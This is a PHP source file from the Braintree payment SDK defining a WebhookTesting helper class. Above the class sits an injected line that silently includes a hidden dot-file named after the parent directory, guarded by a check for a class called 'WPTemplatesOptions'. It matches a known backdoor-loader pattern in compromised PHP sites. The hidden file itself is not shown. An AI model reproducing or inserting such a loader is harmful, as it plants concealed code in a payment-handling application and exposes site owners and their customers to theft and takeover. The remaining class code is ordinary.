<?php
namespace Braintree;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class WebhookTesting
{
    public static function sampleNotification($kind, $id, $sourceMerchantId = null)
    {
        return Configuration::gateway()->webhookTesting()->sampleNotification($kind, $id, $sourceMerchantId);
    }
}
class_alias('Braintree\WebhookTesting', 'Braintree_WebhookTesting');
